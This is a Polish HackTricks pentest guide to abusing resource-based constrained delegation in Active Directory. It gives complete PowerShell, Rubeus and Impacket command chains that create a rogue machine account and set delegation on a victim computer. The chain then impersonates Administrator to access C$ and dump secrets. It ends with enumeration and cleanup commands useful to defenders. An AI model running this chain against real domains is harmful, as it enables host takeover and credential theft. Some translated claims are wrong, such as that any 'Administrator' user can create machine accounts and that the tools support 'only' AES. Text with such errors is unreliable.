# Delegacja Ograniczona na Bazie Zasobów

{{#include ../../banners/hacktricks-training.md}}


## Podstawy Delegacji Ograniczonej na Bazie Zasobów

To jest podobne do podstawowej [Delegacji Ograniczonej](constrained-delegation.md), ale **zamiast** nadawania uprawnień do **obiektu**, aby **podszywać się pod dowolnego użytkownika na maszynie**, Delegacja Ograniczona na Bazie Zasobów **ustawia** w **obiecie, kto może podszywać się pod dowolnego użytkownika wobec niego**.

W tym przypadku, ograniczony obiekt będzie miał atrybut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ z nazwą użytkownika, który może podszywać się pod dowolnego innego użytkownika wobec niego.

Inną ważną różnicą między tą Delegacją Ograniczoną a innymi delegacjami jest to, że każdy użytkownik z **uprawnieniami do zapisu nad kontem maszyny** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) może ustawić **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (W innych formach Delegacji potrzebne były uprawnienia administratora domeny).

### Nowe Koncepcje

W Delegacji Ograniczonej powiedziano, że flaga **`TrustedToAuthForDelegation`** w wartości _userAccountControl_ użytkownika jest potrzebna do wykonania **S4U2Self.** Ale to nie jest całkowita prawda.\
Rzeczywistość jest taka, że nawet bez tej wartości, możesz wykonać **S4U2Self** wobec dowolnego użytkownika, jeśli jesteś **usługą** (masz SPN), ale jeśli **masz `TrustedToAuthForDelegation`**, zwrócony TGS będzie **Forwardable**, a jeśli **nie masz** tej flagi, zwrócony TGS **nie będzie** **Forwardable**.

Jednakże, jeśli **TGS** użyty w **S4U2Proxy** **NIE jest Forwardable**, próba nadużycia **podstawowej Delegacji Ograniczonej** **nie zadziała**. Ale jeśli próbujesz wykorzystać **Delegację Ograniczoną na Bazie Zasobów, to zadziała**.

### Struktura Ataku

> Jeśli masz **uprawnienia równoważne do zapisu** nad kontem **Komputera**, możesz uzyskać **uprzywilejowany dostęp** do tej maszyny.

Załóżmy, że atakujący już ma **uprawnienia równoważne do zapisu nad komputerem ofiary**.

1. Atakujący **kompromituje** konto, które ma **SPN** lub **tworzy jedno** (“Usługa A”). Zauważ, że **jakikolwiek** _Użytkownik Administrator_ bez żadnych innych specjalnych uprawnień może **utworzyć** do 10 obiektów Komputerów (**_MachineAccountQuota_**) i ustawić im **SPN**. Więc atakujący może po prostu stworzyć obiekt Komputera i ustawić SPN.
2. Atakujący **nadużywa swojego uprawnienia ZAPISU** nad komputerem ofiary (Usługa B), aby skonfigurować **delegację ograniczoną na bazie zasobów, aby pozwolić Usłudze A na podszywanie się pod dowolnego użytkownika** wobec tego komputera ofiary (Usługa B).
3. Atakujący używa Rubeus, aby przeprowadzić **pełny atak S4U** (S4U2Self i S4U2Proxy) z Usługi A do Usługi B dla użytkownika **z uprzywilejowanym dostępem do Usługi B**.
1. S4U2Self (z konta SPN, które zostało skompromitowane/stworzone): Prosi o **TGS Administratora dla mnie** (Nie Forwardable).
2. S4U2Proxy: Używa **nie Forwardable TGS** z poprzedniego kroku, aby poprosić o **TGS** od **Administratora** do **komputera ofiary**.
3. Nawet jeśli używasz nie Forwardable TGS, ponieważ wykorzystujesz Delegację Ograniczoną na Bazie Zasobów, to zadziała.
4. Atakujący może **przekazać bilet** i **podszyć się** pod użytkownika, aby uzyskać **dostęp do ofiary Usługi B**.

Aby sprawdzić _**MachineAccountQuota**_ domeny, możesz użyć:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz stworzyć obiekt komputera w obrębie domeny używając **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie delegacji ograniczonej opartej na zasobach

**Używając modułu PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Używanie powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Wykonywanie pełnego ataku S4U (Windows/Rubeus)

Przede wszystkim utworzyliśmy nowy obiekt Komputera z hasłem `123456`, więc potrzebujemy hasha tego hasła:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
To będzie drukować hashe RC4 i AES dla tego konta.\
Teraz atak może być przeprowadzony:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz wygenerować więcej biletów dla większej liczby usług, po prostu pytając raz, używając parametru `/altservice` w Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Zauważ, że użytkownicy mają atrybut o nazwie "**Nie można delegować**". Jeśli użytkownik ma ten atrybut ustawiony na True, nie będziesz mógł go udawać. Ta właściwość jest widoczna w bloodhound.

### Linux tooling: end-to-end RBCD with Impacket (2024+)

Jeśli działasz z systemu Linux, możesz wykonać pełny łańcuch RBCD za pomocą oficjalnych narzędzi Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notatki
- Jeśli wymuszone jest podpisywanie LDAP/LDAPS, użyj `impacket-rbcd -use-ldaps ...`.
- Preferuj klucze AES; wiele nowoczesnych domen ogranicza RC4. Impacket i Rubeus obsługują tylko przepływy AES.
- Impacket może przepisać `sname` ("AnySPN") dla niektórych narzędzi, ale uzyskaj poprawny SPN, gdy tylko to możliwe (np. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Uzyskiwanie dostępu

Ostatnia linia poleceń wykona **pełny atak S4U i wstrzyknie TGS** z Administratora do hosta ofiary w **pamięci**.\
W tym przykładzie poproszono o TGS dla usługi **CIFS** z Administratora, więc będziesz mógł uzyskać dostęp do **C$**:
```bash
ls \\victim.domain.local\C$
```
### Nadużywanie różnych biletów serwisowych

Dowiedz się o [**dostępnych biletach serwisowych tutaj**](silver-ticket.md#available-services).

## Enumeracja, audyt i czyszczenie

### Enumeracja komputerów z skonfigurowanym RBCD

PowerShell (dekodowanie SD w celu rozwiązania SID-ów):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (odczyt lub opróżnienie za pomocą jednego polecenia):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (wyczyść atrybut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Błędy Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Oznacza to, że kerberos jest skonfigurowany tak, aby nie używać DES ani RC4, a Ty dostarczasz tylko hasz RC4. Podaj Rubeus przynajmniej hasz AES256 (lub po prostu dostarcz mu hasze rc4, aes128 i aes256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas bieżącego komputera różni się od czasu DC i kerberos nie działa poprawnie.
- **`preauth_failed`**: Oznacza to, że podana nazwa użytkownika + hasze nie działają przy logowaniu. Mogłeś zapomnieć wstawić "$" w nazwie użytkownika podczas generowania haszy (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Może to oznaczać:
- Użytkownik, którego próbujesz udawać, nie ma dostępu do żądanej usługi (ponieważ nie możesz go udawać lub nie ma wystarczających uprawnień)
- Żądana usługa nie istnieje (jeśli prosisz o bilet na winrm, ale winrm nie działa)
- Fałszywy komputer stracił swoje uprawnienia nad podatnym serwerem i musisz je przywrócić.
- Nadużywasz klasycznego KCD; pamiętaj, że RBCD działa z biletami S4U2Self, które nie są przekazywalne, podczas gdy KCD wymaga biletów przekazywalnych.

## Notatki, przekazy i alternatywy

- Możesz również zapisać RBCD SD przez AD Web Services (ADWS), jeśli LDAP jest filtrowany. Zobacz:

{{#ref}}
adws-enumeration.md
{{#endref}}

- Łańcuchy przekazywania Kerberos często kończą się na RBCD, aby osiągnąć lokalny SYSTEM w jednym kroku. Zobacz praktyczne przykłady end-to-end:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Odniesienia

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (oficjalny): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Szybka ściągawka Linux z aktualną składnią: https://tldrbins.github.io/rbcd/


{{#include ../../banners/hacktricks-training.md}}
